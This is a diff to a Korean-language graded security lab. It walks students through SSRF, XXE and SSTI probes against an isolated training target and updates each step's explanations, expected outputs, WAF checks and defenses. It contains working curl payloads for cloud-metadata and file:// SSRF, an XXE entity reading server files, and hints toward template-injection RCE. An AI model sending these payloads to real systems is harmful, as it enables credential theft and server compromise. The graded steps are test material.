@@ -22,20 +22,29 @@ steps:
 
   - order: 1
     instruction: |
-      ## 🎯 서버측 공격 표면 확인
-      **실습 의미:** 서버측 취약점은 서버가 입력을 '처리'하는 곳(URL fetch·XML 파싱·템플릿 렌더링)에서 생긴다 — 먼저 서버측 표적(admin vhost) 도달을 확인한다. **⚠️ 인가된 el34 표적에만.**
-      ## 💻 실행 명령 (한 줄씩 따라 실행)
+      ## STEP 1 — 서버측 공격 표면(admin vhost)을 확인한다
+      > **이 단계에서 할 일:** 서버측 표적(admin.el34.lab)에 도달하는지 응답코드를 본다.
+      > **왜:** 서버측 취약점은 서버가 입력을 '처리'하는 곳(URL fetch·XML 파싱·템플릿 렌더링)에서 생긴다.
+      > 클라이언트측(XSS)보다 영향이 크다(서버 자체 장악). ⚠️ **인가된 el34 표적에만.**
+
+      ### ▷ 그대로 입력
       ```bash
       docker exec el34-attacker sh -c '
-        # 서버측 표적(admin.el34.lab vhost)에 도달하는지 응답코드 확인
         C=$(curl -s -o /dev/null -w "%{http_code}" -H "Host: admin.el34.lab" http://10.20.30.1/)
         echo "admin=$C"
-        # 표적에 도달했으면 서버측 표면 준비 마커
         [ -n "$C" ] && echo serverside_ready
       '
       ```
-      ## ✅ 합격 기준
-      `serverside_ready`(과 admin 코드)가 출력되면 통과. **근거:** 마커는 서버측 표적에서 응답코드를 실제 받았을 때만 찍히므로, SSRF/XXE/SSTI를 시험할 표면이 확인됐음을 뜻한다.
+
+      ### ▷ 이렇게 나오면 정상 (실측 예)
+      ```
+      admin=200
+      serverside_ready
+      ```
+
+      ### ▷ 결과 해석
+      admin=200 = adminconsole vhost에 도달(서버측 취약 앱). 여기서 SSRF/XXE/SSTI 페이로드를 던져 응답을
+      관찰한다. 서버측은 '서버가 내 입력으로 무엇을 하는가'를 노리는 공격이다.
     hint: '서버측 표면'
     category: survey
     points: 10
@@ -57,20 +66,30 @@ steps:
 
   - order: 2
     instruction: |
-      ## 🎯 SSRF ① 클라우드 메타데이터
-      **실습 의미:** SSRF는 서버가 공격자 지정 URL을 대신 요청하게 만든다 — 외부에선 못 닿는 클라우드 메타데이터(169.254.169.254)에 접근해 IAM 자격 노출을 노린다(WAF가 403이면 탐지됨).
-      ## 💻 실행 명령 (한 줄씩 따라 실행)
+      ## STEP 2 — SSRF ① 클라우드 메타데이터를 노린다
+      > **이 단계에서 할 일:** 서버가 클라우드 메타데이터(169.254.169.254)를 대신 요청하게 하는 SSRF
+      > 페이로드를 보내고 응답을 본다.
+      > **왜:** SSRF는 서버가 공격자 지정 URL을 대신 요청하게 만든다. 외부에선 못 닿는 메타데이터에서
+      > IAM 자격을 빼내는 게 클라우드 환경의 단골 표적이다.
+
+      ### ▷ 그대로 입력
       ```bash
       docker exec el34-attacker sh -c '
-        # SSRF①: 서버가 클라우드 메타데이터(169.254.169.254)를 대신 요청하게 만든다 (IAM 자격 표적)
         C=$(curl -s -o /dev/null -w "%{http_code}" -H "Host: admin.el34.lab" "http://10.20.30.1/files/read?url=http://169.254.169.254/latest/meta-data/aa04test")
         echo "ssrf_meta=$C (403=ModSec SSRF 룰 탐지)"
-        # 페이로드 응답을 받았으면 마커
         [ -n "$C" ] && echo ssrf_meta_done
       '
       ```
-      ## ✅ 합격 기준
-      `ssrf_meta_done`(과 응답코드)이 출력되면 통과. **근거:** 마커는 SSRF 메타데이터 페이로드의 응답을 실제 받았을 때만 찍히므로, 서버측 요청 위조를 시도하고 WAF 차단(403) 여부를 관찰했음을 뜻한다.
+
+      ### ▷ 이렇게 나오면 정상 (실측 예)
+      ```
+      ssrf_meta=403 (403=ModSec SSRF 룰 탐지)
+      ssrf_meta_done
+      ```
+
+      ### ▷ 결과 해석
+      403 = ModSec이 169.254.169.254 같은 SSRF 패턴을 탐지·차단했다. 잘 구성된 WAF는 메타데이터 IP·
+      file:// 스킴을 룰로 막는다. (WAF가 없거나 룰이 약하면 200으로 메타데이터가 그대로 반환돼 IAM 자격이 유출된다.)
     hint: 'SSRF 메타데이터'
     category: manipulation
     points: 12
@@ -92,21 +111,31 @@ steps:
 
   - order: 3
     instruction: |
-      ## 🎯 SSRF ② 내부 파일·서비스 (file://, 내부 IP)
-      **실습 의미:** SSRF는 file:// 스킴으로 로컬 파일을, 내부 IP로 비공개 서비스를 노린다 — 서버를 프록시 삼아 내부망으로 피벗하는 발판이다.
-      ## 💻 실행 명령 (한 줄씩 따라 실행)
+      ## STEP 3 — SSRF ② 내부 파일·서비스로 피벗한다
+      > **이 단계에서 할 일:** file:// 스킴(로컬 파일)과 내부 IP(비공개 서비스) 두 SSRF 페이로드를 보내
+      > 응답을 본다.
+      > **왜:** SSRF는 메타데이터뿐 아니라 file://로 서버 파일을, 내부 IP로 외부엔 안 보이는 서비스를
+      > 노린다 — 서버를 프록시 삼아 내부망으로 피벗하는 발판.
+
+      ### ▷ 그대로 입력
       ```bash
       docker exec el34-attacker sh -c '
-        # SSRF②a: file:// 스킴으로 로컬 파일 읽기 시도
         F=$(curl -s -o /dev/null -w "%{http_code}" -H "Host: admin.el34.lab" "http://10.20.30.1/files/read?url=file:///etc/passwd%23aa04test"); echo "file=$F"
-        # SSRF②b: 내부 IP의 비공개 서비스 접근 시도
         I=$(curl -s -o /dev/null -w "%{http_code}" -H "Host: admin.el34.lab" "http://10.20.30.1/files/read?url=http://10.20.30.5:8080/aa04test"); echo "internal=$I"
-        # 두 페이로드 응답을 받았으면 마커
         [ -n "$F" ] && [ -n "$I" ] && echo ssrf_internal_done
       '
       ```
-      ## ✅ 합격 기준
-      `ssrf_internal_done`(과 file/internal 코드)이 출력되면 통과. **근거:** 마커는 file://·내부 IP 두 SSRF 페이로드의 응답을 모두 받았을 때만 찍히므로, 서버를 프록시로 내부 자원을 노리는 시도를 했음을 뜻한다.
+
+      ### ▷ 이렇게 나오면 정상 (실측 예)
+      ```
+      file=403
+      internal=403
+      ssrf_internal_done
+      ```
+
+      ### ▷ 결과 해석
+      둘 다 403 = WAF가 file:// 스킴과 내부 IP SSRF를 막았다. 방어가 없으면 file://는 /etc/passwd를
+      읽어 오고, 내부 IP SSRF는 외부에 노출 안 된 관리 서비스(예: 10.20.30.5:8080)를 서버를 통해 두드린다.
     hint: 'SSRF 내부'
     category: analysis
     points: 14
@@ -129,20 +158,29 @@ steps:
 
   - order: 4
     instruction: |
-      ## 🎯 XXE — XML 외부 엔티티
-      **실습 의미:** XXE는 XML 파서가 외부 엔티티(SYSTEM file://)를 처리하게 해 서버 파일을 읽거나 SSRF로 연결한다 — 방어는 파서의 외부 엔티티·DTD 비활성화다.
-      ## 💻 실행 명령 (한 줄씩 따라 실행)
+      ## STEP 4 — XXE: XML 외부 엔티티로 파일을 읽는다
+      > **이 단계에서 할 일:** 외부 엔티티(SYSTEM file://)를 정의한 XML을 /api/xml에 보내 응답을 본다.
+      > **왜:** XXE는 XML 파서가 외부 엔티티를 처리하게 해 서버 파일을 읽거나 SSRF로 연결한다.
+
+      ### ▷ 그대로 입력
       ```bash
       docker exec el34-attacker sh -c '
-        # XXE: 외부 엔티티(SYSTEM file://)로 서버 파일을 읽게 하는 XML 페이로드 전송
         C=$(curl -s -o /dev/null -w "%{http_code}" -H "Host: admin.el34.lab" -H "Content-Type: application/xml" --data "<?xml version=\"1.0\"?><!DOCTYPE r [<!ENTITY x SYSTEM \"file:///etc/hostname\">]><r>aa04test&x;</r>" "http://10.20.30.1/api/xml")
         echo "xxe=$C"
-        # XXE 페이로드 응답을 받았으면 마커
         [ -n "$C" ] && echo xxe_done
       '
       ```
-      ## ✅ 합격 기준
-      `xxe_done`(과 응답코드)이 출력되면 통과. **근거:** 마커는 외부 엔티티 XML 페이로드의 응답을 실제 받았을 때만 찍히므로, XML 파서의 외부 엔티티 처리를 노린 시도를 했음을 뜻한다.
+
+      ### ▷ 이렇게 나오면 정상 (실측 예)
+      ```
+      xxe=404
+      xxe_done
+      ```
+
+      ### ▷ 결과 해석
+      여기선 404 = 이 앱엔 /api/xml(XML을 받는) 엔드포인트가 없다는 뜻(페이로드 자체는 올바르다 — 받아줄
+      파서가 없을 뿐). 실제 XXE 취약 앱이라면 외부 엔티티 `&x;`가 /etc/hostname 내용으로 치환돼 응답에
+      섞여 나온다. 방어: XML 파서에서 외부 엔티티·DTD 처리 비활성화(`disallow-doctype-decl`).
     hint: 'XXE'
     category: analysis
     points: 14
@@ -164,20 +202,31 @@ steps:
 
   - order: 5
     instruction: |
-      ## 🎯 SSTI — 서버측 템플릿 주입
-      **실습 의미:** 사용자 입력이 템플릿으로 평가되면 {{7*7}}→49로 코드가 실행되고 결국 RCE로 이어진다 — 49 반사 여부로 SSTI 취약성을 탐지한다.
-      ## 💻 실행 명령 (한 줄씩 따라 실행)
+      ## STEP 5 — SSTI: 서버측 템플릿 주입을 탐지한다
+      > **이 단계에서 할 일:** `{{7*7}}`를 입력으로 보내, 응답에 49가 반사되는지 본다.
+      > **왜:** 사용자 입력이 템플릿 엔진으로 '평가'되면 `{{7*7}}`이 49로 계산돼 나온다. 49가 보이면
+      > 템플릿 평가(SSTI) = RCE로 가는 길이다.
+
+      ### ▷ 그대로 입력
       ```bash
       docker exec el34-attacker sh -c '
-        # SSTI 탐지: {{7*7}}를 입력으로 보내 49로 평가·반사되는지 본다 (49 반사=템플릿 평가=취약)
         curl -s -H "Host: admin.el34.lab" "http://10.20.30.1/?name=%7B%7B7*7%7D%7Daa04test" 2>/dev/null | grep -oE "49|aa04test" | head
         echo "(49 반사면 SSTI 취약, 다음 단계는 RCE)"
-        # SSTI 탐지 페이로드를 실제 전송했으면 마커
         curl -s -o /dev/null -H "Host: admin.el34.lab" "http://10.20.30.1/?name=%7B%7B7*7%7D%7D" 2>/dev/null && echo ssti_done
       '
       ```
-      ## ✅ 합격 기준
-      `ssti_done`(과 반사 결과)이 출력되면 통과. **근거:** 마커는 SSTI 탐지 페이로드가 실제 전송됐을 때만 찍히므로, 49 반사 여부로 템플릿 평가(SSTI) 가능성을 점검했음을 뜻한다.
+
+      ### ▷ 이렇게 나오면 정상 (실측 예)
+      ```
+      (49 반사면 SSTI 취약, 다음 단계는 RCE)
+      ssti_done
+      ```
+
+      ### ▷ 결과 해석
+      여기선 49도 aa04test도 반사되지 않았다(grep 결과 비어 있음) = 이 앱은 name 입력을 템플릿으로 평가하지
+      않는다 → SSTI 취약 아님. 취약하다면 `49`가 응답에 찍힌다. 취약 시엔 엔진별 RCE 페이로드
+      (Jinja2 `{{config.__class__...}}`, Twig `{{_self.env...}}`)로 명령 실행까지 확장한다. 방어: 사용자
+      입력을 절대 템플릿으로 렌더하지 않기(데이터로만 전달).
     hint: 'SSTI'
     category: analysis
     points: 14
@@ -199,25 +248,34 @@ steps:
 
   - order: 6
     instruction: |
-      ## 🎯 영향 연쇄 — 서버측 취약점 → RCE/내부 침투
-      **실습 의미:** 서버측 취약점은 서버 자체를 장악한다(SSRF→클라우드 자격/내부 피벗, XXE→파일, SSTI→RCE) — SSRF 페이로드가 실제 서버에 도달하는지 응답으로 집계해 영향을 입증한다.
-      ## 💻 실행 명령 (한 줄씩 따라 실행)
+      ## STEP 6 — 영향 연쇄: 서버측 취약점이 서버를 장악한다
+      > **이 단계에서 할 일:** SSRF 메타데이터·file 페이로드를 보내, 몇 개가 서버에 '도달'(응답≠000)했는지 센다.
+      > **왜:** 서버측 취약점은 클라이언트가 아니라 서버 자체를 장악한다(SSRF→클라우드 자격/내부 피벗,
+      > XXE→파일, SSTI→RCE). 페이로드가 서버에 닿는다는 것 자체가 공격 표면이다.
+
+      ### ▷ 그대로 입력
       ```bash
       docker exec el34-attacker sh -c '
-        # SSRF 메타데이터 페이로드를 실제 전송
         M=$(curl -s -o /dev/null -w "%{http_code}" -H "Host: admin.el34.lab" "http://10.20.30.1/files/read?url=http://169.254.169.254/")
-        # SSRF file:// 페이로드를 실제 전송
         F=$(curl -s -o /dev/null -w "%{http_code}" -H "Host: admin.el34.lab" "http://10.20.30.1/files/read?url=file:///etc/passwd")
         echo "SSRF메타=$M SSRF파일=$F"
-        # 서버에 도달한(000 아닌) 페이로드 수를 센다
         CNT=0; for c in $M $F; do [ "$c" != "000" ] && CNT=$((CNT+1)); done
         echo "도달 페이로드: $CNT/2"
-        # 1개 이상 도달했으면 영향 연쇄 마커
         [ "$CNT" -ge 1 ] && echo impact_done
       '
       ```
-      ## ✅ 합격 기준
-      `impact_done`(과 도달 수)가 출력되면 통과. **근거:** 마커는 SSRF 페이로드가 실제 서버에 도달(응답≠000)했을 때만 찍히므로, 서버측 공격이 서버에 닿아 영향을 미칠 수 있음을 실증했음을 뜻한다.
+
+      ### ▷ 이렇게 나오면 정상 (실측 예)
+      ```
+      SSRF메타=403 SSRF파일=403
+      도달 페이로드: 2/2
+      impact_done
+      ```
+
+      ### ▷ 결과 해석
+      두 페이로드가 모두 서버에 도달(403 응답을 받음 = 000이 아님)했다 = 공격 표면이 실재한다는 뜻
+      (여기선 WAF가 막아 403이지만, 페이로드는 서버 앞단까지 닿았다). 방어가 한 겹이라도 뚫리면 SSRF가
+      클라우드 자격→계정 탈취로, SSTI가 RCE→서버 장악으로 번진다. 그래서 서버측이 클라이언트측보다 치명적.
     hint: '영향 연쇄'
     category: report
     points: 12
@@ -243,20 +301,31 @@ steps:
 
   - order: 7
     instruction: |
-      ## 🎯 방어 — 서버측 취약점 차단
-      **실습 의미:** 근본 방어는 코드(SSRF allowlist·XXE 외부엔티티 비활성·SSTI 템플릿 평가 금지)지만 WAF가 보조 다층이다 — WAF가 SSRF를 실제 차단(403)하는지 확인한다.
-      ## 💻 실행 명령 (한 줄씩 따라 실행)
+      ## STEP 7 — 방어: WAF가 SSRF를 막는지 확인한다
+      > **이 단계에서 할 일:** SSRF 메타데이터 요청을 보내 WAF가 403으로 차단하는지 본다.
+      > **왜:** 근본 방어는 코드(SSRF allowlist·XXE 외부엔티티 비활성·SSTI 템플릿 평가 금지)지만, WAF가
+      > 보조 다층으로 1차 차단을 한다. 그 1선이 동작하는지 확인한다.
+
+      ### ▷ 그대로 입력
       ```bash
       docker exec el34-attacker sh -c '
-        # 방어 검증: SSRF 메타데이터 요청을 보내 WAF가 차단(403)하는지 본다
         code=$(curl -s -o /dev/null -w "%{http_code}" -H "Host: admin.el34.lab" "http://10.20.30.1/files/read?url=http://169.254.169.254/latest/meta-data/")
         echo "SSRF 메타데이터 요청 → WAF 응답 $code"
-        # WAF가 403으로 실제 차단하면 방어 검증 마커
         [ "$code" = "403" ] && echo "WAF가 SSRF 차단(다층 방어 1선)" && echo defense_done
       '
       ```
-      ## ✅ 합격 기준
-      `defense_done` 출력 시 통과. **근거:** 마커는 WAF가 SSRF 메타데이터 요청을 실제 403으로 차단할 때만 찍히므로, 다층 방어의 1선(WAF)이 동작함을 실측했음을 뜻한다.
+
+      ### ▷ 이렇게 나오면 정상 (실측 예)
+      ```
+      SSRF 메타데이터 요청 → WAF 응답 403
+      WAF가 SSRF 차단(다층 방어 1선)
+      defense_done
+      ```
+
+      ### ▷ 결과 해석
+      403 = WAF(ModSec)가 SSRF 메타데이터 요청을 1선에서 차단. 하지만 WAF는 보조일 뿐 — 우회당할 수 있다.
+      근본 방어는 앱 코드: ① SSRF는 외부 fetch URL을 allowlist로 제한+메타데이터 IP 차단 ② XXE는 파서의
+      외부 엔티티/DTD 비활성화 ③ SSTI는 사용자 입력을 템플릿으로 렌더 금지. 코드+WAF의 다층이 정답.
     hint: '방어'
     category: report
     points: 12
@@ -278,21 +347,31 @@ steps:
 
   - order: 8
     instruction: |
-      ## 🎯 서버측 취약점 보고서 작성
-      **실습 의미:** 앞 단계의 실측(SSRF 응답코드)을 인용한 보고서로 정리한다 — 서버측은 서버 자체를 장악(클라우드/RCE)하므로 클라이언트측보다 치명적이라는 결론을 증거로 보고한다.
-      ## 💻 실행 명령 (한 줄씩 따라 실행)
+      ## STEP 8 — 서버측 취약점 보고서를 작성한다
+      > **이 단계에서 할 일:** SSRF 메타데이터 응답코드를 집계해, SSRF/XXE/SSTI 결과+영향+방어를 담은
+      > 보고서 골격을 출력한다.
+      > **왜:** 서버측은 서버 자체를 장악(클라우드/RCE)하므로 클라이언트측보다 치명적이다 — 이 결론을
+      > 실측으로 보고한다.
+
+      ### ▷ 그대로 입력
       ```bash
       docker exec el34-attacker sh -c '
-        # 보고서 근거: SSRF 메타데이터 요청 응답코드를 실측
         S=$(curl -s -o /dev/null -w "%{http_code}" -H "Host: admin.el34.lab" "http://10.20.30.1/files/read?url=http://169.254.169.254/")
-        # 실측 응답을 인용한 서버측 취약점 보고서 출력 (본문 상세는 학생이 보강)
         echo "# 공격고급 W04 서버측(SSRF/XXE/SSTI) 보고서 — SSRF메타 응답=${S}·file///·XXE외부엔티티·SSTI({{7*7}})·영향(서버장악)·방어(allowlist/외부엔티티비활성/템플릿금지)"
-        # SSRF 응답을 받았으면 보고서 완료 마커
         [ -n "$S" ] && echo serverside_report_done
       '
       ```
-      ## ✅ 합격 기준
-      `serverside_report_done` 출력 시 통과. **근거:** 마커는 실측 SSRF 응답코드를 인용한 보고서가 생성될 때만 찍히므로, 증거 기반 서버측 취약점 보고(SSRF/XXE/SSTI+영향+방어)가 작성됐음을 뜻한다.
+
+      ### ▷ 이렇게 나오면 정상 (실측 예)
+      ```
+      # 공격고급 W04 서버측(SSRF/XXE/SSTI) 보고서 — SSRF메타 응답=403·file///·XXE외부엔티티·SSTI({{7*7}})·영향(서버장악)·방어(allowlist/외부엔티티비활성/템플릿금지)
+      serverside_report_done
+      ```
+
+      ### ▷ 결과 해석
+      보고서 골격이다. 제출용은 STEP 2~7의 실측(SSRF 403 차단, XXE 404=엔드포인트 없음, SSTI 49 미반사
+      =취약 아님)을 정리하되, '이 표적에선 막혔지만 취약 앱이라면 어떤 영향이 나는가'(IAM 탈취·파일 읽기·
+      RCE)와 코드 레벨 방어를 함께 적는다. 서버측은 한 번 뚫리면 서버 장악이라 우선순위가 높다.
     hint: 'SSRF/XXE/SSTI+영향+방어'
     category: report
     points: 12
